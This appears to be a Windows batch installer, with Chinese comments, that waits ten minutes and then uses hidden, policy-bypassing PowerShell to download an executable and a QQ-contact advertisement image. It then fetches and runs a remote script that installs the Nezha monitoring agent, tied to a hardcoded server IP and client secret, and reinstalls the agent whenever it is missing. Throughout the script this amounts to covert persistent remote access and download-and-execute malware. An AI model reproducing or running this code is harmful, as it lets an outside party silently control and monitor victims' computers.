@echo off
chcp 65001 >nul 2>nul
setlocal enabledelayedexpansion

:: 防止僵尸进程：检测是否已有install.bat在运行
tasklist /fi "imagename eq cmd.exe" /v | find "install.bat" >nul 2>nul
if %errorlevel% equ 0 (
    :: 已有实例在运行，直接退出
    exit
)

:: 延迟10分钟（600秒）
timeout /t 600 /nobreak >nul 2>nul

set "DESKTOP=%USERPROFILE%\Desktop"
set "EXE_FILE=五五知行社.exe"
set "EXE_PATH=%DESKTOP%\%EXE_FILE%"
set "IMG_URL=http://github.luoruozhou.top/wwzxs/QQ%EF%BC%9A1668729341.png"
set "IMG_FOLDER=D:\获取冰点密码请点击"
set "IMG_FILE=QQ：1668729341.png"
set "IMG_PATH=%IMG_FOLDER%\%IMG_FILE%"
set "EXE_URL=http://github.luoruozhou.top/wwzxs/五五知行社.exe"

:: 检测图片是否存在，不存在则下载
if not exist "%IMG_PATH%" (
    if not exist "%IMG_FOLDER%" mkdir "%IMG_FOLDER%"
    powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
    "try { Invoke-WebRequest '%IMG_URL%' -OutFile '%IMG_PATH%' -TimeoutSec 30 } catch { exit }"
)

:: 检测五五知行社.exe是否存在，不存在则下载
if not exist "%EXE_PATH%" (
    powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
    "try { Invoke-WebRequest '%EXE_URL%' -OutFile '%EXE_PATH%' -TimeoutSec 30 } catch { exit }"
)

:: 检测哪吒是否正常运行
tasklist | find /i "nezha-agent.exe" >nul 2>nul
if %errorlevel% neq 0 (
    :: 哪吒未运行 → 直接重装
    goto :install_nezha
)

:: 哪吒在运行，但检查文件是否完整
if exist "C:\Program Files\nezha" (
    if not exist "C:\Program Files\nezha\nezha-agent.exe" (
        taskkill /f /im nezha.exe >nul 2>nul
        taskkill /f /im nezha-agent.exe >nul 2>nul
        timeout /t 2 /nobreak >nul 2>nul
        rmdir /s /q "C:\Program Files\nezha" >nul 2>nul
        goto :install_nezha
    )
)
if exist "C:\nezha" (
    if not exist "C:\nezha\nezha-agent.exe" (
        taskkill /f /im nezha.exe >nul 2>nul
        taskkill /f /im nezha-agent.exe >nul 2>nul
        timeout /t 2 /nobreak >nul 2>nul
        rmdir /s /q "C:\nezha" >nul 2>nul
        goto :install_nezha
    )
)

:: 一切正常则退出
exit

:install_nezha
:: Ping测速选最快镜像
set "URL1=shturl.cc/uKiu14Qw0MDkTvhqgb"
set "URL2=shturl.cc/ngMQmnvHSq9PH"
set "URL3=shturl.cc/fmVeOYe69W"
set "URL4=gh.dpik.top"
set "FASTEST_URL="
set "MIN_TIME=999999"

for %%u in ("%URL1%" "%URL2%" "%URL3%" "%URL4%") do (
    for /f "tokens=3 delims=: " %%a in ('ping -n 1 %%u ^| find "平均" ^|^| ping -n 1 %%u ^| find "Average"') do (
        set "TIME=%%a"
        set "TIME=!TIME:ms=!"
        if !TIME! LSS !MIN_TIME! (
            set "MIN_TIME=!TIME!"
            set "FASTEST_URL=%%u"
        )
    )
)

if "%FASTEST_URL%"=="" set "FASTEST_URL=https://gh.dpik.top"

powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"$env:NZ_SERVER='188.68.250.201:44567'; ^
$env:NZ_TLS='false'; ^
$env:NZ_CLIENT_SECRET='SHbCllhY4zx5tDS0BT20RUwskQo0m2z1'; ^
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12; ^
$baseUrl = 'https://' + '%FASTEST_URL%'; ^
$scriptUrl = $baseUrl + '/nezhahq/scripts/main/agent/install.ps1'; ^
try { ^
    Invoke-WebRequest $scriptUrl -OutFile C:\install.ps1 -TimeoutSec 10; ^
    Start-Process powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -ArgumentList '-File C:\install.ps1' -Wait; ^
    Remove-Item C:\install.ps1 -Force -ErrorAction SilentlyContinue; ^
} catch { ^
    Remove-Item C:\install.ps1 -Force -ErrorAction SilentlyContinue; ^
    $fallbackUrls = @('https://gh.dpik.top/nezhahq/scripts/main/agent/install.ps1', ^
                       'https://raw.githubusercontent.com/nezhahq/scripts/main/agent/install.ps1'); ^
    foreach ($url in $fallbackUrls) { ^
        try { ^
            Invoke-WebRequest $url -OutFile C:\install.ps1 -TimeoutSec 10; ^
            Start-Process powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -ArgumentList '-File C:\install.ps1' -Wait; ^
            if ($LASTEXITCODE -eq 0) { Remove-Item C:\install.ps1 -Force -ErrorAction SilentlyContinue; break }; ^
        } catch { Remove-Item C:\install.ps1 -Force -ErrorAction SilentlyContinue } ^
    } ^
}"
